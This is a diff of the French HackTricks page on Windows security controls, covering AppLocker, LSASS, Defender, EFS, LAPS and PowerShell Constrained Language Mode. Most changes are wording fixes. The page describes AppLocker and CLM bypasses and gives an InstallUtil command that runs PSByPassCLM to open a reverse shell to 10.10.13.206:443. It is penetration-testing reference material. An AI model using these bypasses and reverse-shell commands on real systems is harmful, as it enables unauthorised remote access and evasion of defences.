@@ -4,15 +4,15 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
 Obtenez un accès aujourd'hui :
@@ -21,9 +21,9 @@ Obtenez un accès aujourd'hui :
 
 ## Politique AppLocker
 
-Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nocifs et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques d'une organisation.&#x20;
+Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nocifs et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques d'une organisation.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la solution de **liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **les applications et les fichiers que les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées. \
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la solution de **liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **les applications et les fichiers que les utilisateurs peuvent exécuter**. Il offre un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
 Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.
 
 ### Vérification
@@ -51,7 +51,7 @@ C:\windows\tracing
 * Les binaires **"LOLBAS"** couramment **fiables** peuvent également être utiles pour contourner AppLocker.
 * Les règles mal écrites peuvent également être contournées.
 * Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
-* Les organisations se concentrent souvent sur le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`, mais oublient les **autres emplacements** [**d'exécutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
+* Les organisations se concentrent souvent sur le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`, mais oublient les **autres emplacements** [**d'exécution de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
 * L'application des DLL est très rarement activée en raison de la charge supplémentaire qu'elle peut mettre sur un système et de la quantité de tests nécessaires pour s'assurer que rien ne se cassera. Ainsi, l'utilisation de DLL comme portes dérobées aidera à contourner AppLocker.
 * Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour exécuter du code Powershell dans n'importe quel processus et contourner AppLocker. Pour plus d'informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
@@ -64,7 +64,7 @@ Les informations d'identification locales sont présentes dans ce fichier, les m
 ### Autorité de sécurité locale (LSA) - LSASS
 
 Les **informations d'identification** (hachées) sont **enregistrées** dans la **mémoire** de ce sous-système pour des raisons de connexion unique.\
-LSA administre la **politique de sécurité** locale (politique de mot de passe, autorisations des utilisateurs...), l'**authentification**, les **jetons d'accès**...\
+LSA administre la **stratégie de sécurité** locale (stratégie de mot de passe, autorisations des utilisateurs...), l'**authentification**, les **jetons d'accès**...\
 LSA sera celui qui **vérifiera** les informations d'identification fournies dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.
 
 Les **informations d'identification** sont **enregistrées** à l'intérieur du processus LSASS : tickets Kerberos, hachages NT et LM, mots de passe facilement déchiffrables.
@@ -88,7 +88,7 @@ Il s'agit de la base de données de l'Active Directory. Elle n'est présente que
 
 ### Vérification
 
-Pour vérifier l'état de **Defender**, vous pouvez exécuter la commande PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :
+Pour vérifier l'état de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s'il est actif) :
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -104,7 +104,8 @@ NISEngineVersion                : 0.0.0.0
 [...]
 <strong>RealTimeProtectionEnabled       : True
 </strong>RealTimeScanDirection           : 0
-PSComputerName                  :</code></pre>
+PSComputerName                  :
+</code></pre>
 
 Pour l'énumérer, vous pouvez également exécuter :
 ```bash
@@ -122,7 +123,7 @@ EFS fonctionne en chiffrant un fichier avec une **clé symétrique** en vrac, é
 Exemples de fichiers déchiffrés sans que l'utilisateur ne le demande :
 
 * Les fichiers et dossiers sont déchiffrés avant d'être copiés sur un volume formaté avec un autre système de fichiers, comme [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
-* Les fichiers chiffrés sont copiés via le protocole SMB/CIFS, les fichiers sont déchiffrés avant d'être envoyés via le réseau.
+* Les fichiers chiffrés sont copiés via le protocole SMB/CIFS, les fichiers sont déchiffrés avant d'être envoyés sur le réseau.
 
 Les fichiers chiffrés selon cette méthode peuvent être **accédés de manière transparente par l'utilisateur propriétaire** (celui qui les a chiffrés), donc si vous pouvez **devenir cet utilisateur**, vous pouvez déchiffrer les fichiers (changer le mot de passe de l'utilisateur et vous connecter en tant que lui ne fonctionnera pas).
 
@@ -147,7 +148,7 @@ Cette méthode nécessite que l'**utilisateur victime** exécute un **processus*
 
 Dans la plupart des infrastructures, les comptes de service sont des comptes utilisateur classiques avec l'option "**Mot de passe jamais expiré**". La gestion de ces comptes peut être un vrai casse-tête, c'est pourquoi Microsoft a introduit les **comptes de service gérés** :
 
-* Plus de gestion de mot de passe. Il utilise un mot de passe complexe, aléatoire et de 240 caractères qui change automatiquement lorsqu'il atteint la date d'expiration du mot de passe du domaine ou de l'ordinateur.
+* Plus de gestion des mots de passe. Il utilise un mot de passe complexe, aléatoire et de 240 caractères qui change automatiquement lorsqu'il atteint la date d'expiration du mot de passe du domaine ou de l'ordinateur.
 * Il utilise le service de distribution de clés (KDC) de Microsoft pour créer et gérer les mots de passe des gMSA.
 * Il ne peut pas être verrouillé ni utilisé pour une connexion interactive.
 * Prise en charge du partage sur plusieurs hôtes.
@@ -168,7 +169,7 @@ De plus, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/
 
 ## LAPS
 
-****[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) vous permet de gérer le mot de passe de l'administrateur local (qui est aléatoire, unique et modifié régulièrement) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Si votre utilisateur dispose des autorisations suffisantes, vous pourrez peut-être lire les mots de passe des administrateurs locaux.
+\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) vous permet de gérer le mot de passe de l'administrateur local (qui est aléatoire, unique et changé régulièrement) sur les ordinateurs joints au domaine. Ces mots de passe sont stockés de manière centralisée dans Active Directory et restreints aux utilisateurs autorisés à l'aide des ACL. Si votre utilisateur dispose des autorisations suffisantes, vous pourrez peut-être lire les mots de passe des administrateurs locaux.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -176,7 +177,7 @@ De plus, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/
 
 ## Mode de langage PowerShell restreint
 
-PowerShell **** [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille bon nombre des fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, l'autorisation uniquement des types .NET approuvés, les flux de travail basés sur XAML, les classes PowerShell, et plus encore.
+PowerShell \*\*\*\* [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille bon nombre des fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, l'autorisation uniquement des types .NET approuvés, les flux de travail basés sur XAML, les classes PowerShell, et plus encore.
 
 ### **Vérification**
 ```powershell
@@ -188,7 +189,7 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-Dans les versions actuelles de Windows, cette méthode de contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).
+Dans la version actuelle de Windows, cette méthode de contournement ne fonctionnera pas, mais vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).
 
 **Pour le compiler, vous devrez peut-être** **ajouter une référence** -> _Parcourir_ -> _Parcourir_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **modifier le projet en .Net4.5**.
 
@@ -196,15 +197,11 @@ Dans les versions actuelles de Windows, cette méthode de contournement ne fonct
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Shell inversé:
+#### Shell inversée:
 
-A reverse shell is a technique used by attackers to gain remote access to a target system. Instead of the attacker connecting directly to the target, the target system initiates a connection back to the attacker's machine. This allows the attacker to bypass firewalls and other security measures that may be in place.
+A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.
 
-To establish a reverse shell, the attacker typically exploits a vulnerability in the target system, such as a weak authentication mechanism or a software vulnerability. Once the attacker gains control of the target system, they can execute commands and interact with the system as if they were physically present.
-
-Reverse shells are commonly used in post-exploitation scenarios, where the attacker wants to maintain persistent access to the target system. By establishing a reverse shell, the attacker can easily reconnect to the target system at a later time without having to go through the initial exploitation process again.
-
-It is important for system administrators to be aware of the risks associated with reverse shells and take steps to prevent them. This includes implementing strong authentication mechanisms, keeping software up to date with the latest security patches, and monitoring network traffic for any suspicious activity.
+Une shell inversée est une technique utilisée par les hackers pour obtenir un accès distant à un système cible. Elle consiste à établir une connexion depuis le système cible vers la machine de l'attaquant, ce qui permet à l'attaquant d'exécuter des commandes sur le système cible.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -238,7 +235,7 @@ Plus d'informations peuvent être trouvées [ici](https://blog.netspi.com/15-way
 
 C'est l'API qui peut être utilisée pour authentifier les utilisateurs.
 
-Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera le protocole d'authentification qui sera utilisé, ces protocoles d'authentification sont appelés fournisseurs de support de sécurité (SSP), ils sont situés à l'intérieur de chaque machine Windows sous forme de DLL et les deux machines doivent prendre en charge le même pour pouvoir communiquer.
+Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera le protocole d'authentification qui sera utilisé. Ces protocoles d'authentification sont appelés fournisseurs de support de sécurité (SSP) et sont situés à l'intérieur de chaque machine Windows sous la forme d'une DLL. Les deux machines doivent prendre en charge le même protocole pour pouvoir communiquer.
 
 ### Principaux SSP
 
@@ -250,7 +247,7 @@ Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui sou
 * %windir%\Windows\System32\Wdigest.dll
 * **Schannel** : SSL et TLS
 * %windir%\Windows\System32\Schannel.dll
-* **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant celui par défaut)
+* **Negotiate** : Il est utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant le protocole par défaut)
 * %windir%\Windows\System32\lsasrv.dll
 
 #### La négociation peut offrir plusieurs méthodes ou une seule.
@@ -263,17 +260,13 @@ Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui sou
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-
-
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
-
 
 <details>
 
@@ -282,7 +275,7 @@ Accédez dès aujourd'hui :
 * Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au référentiel [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
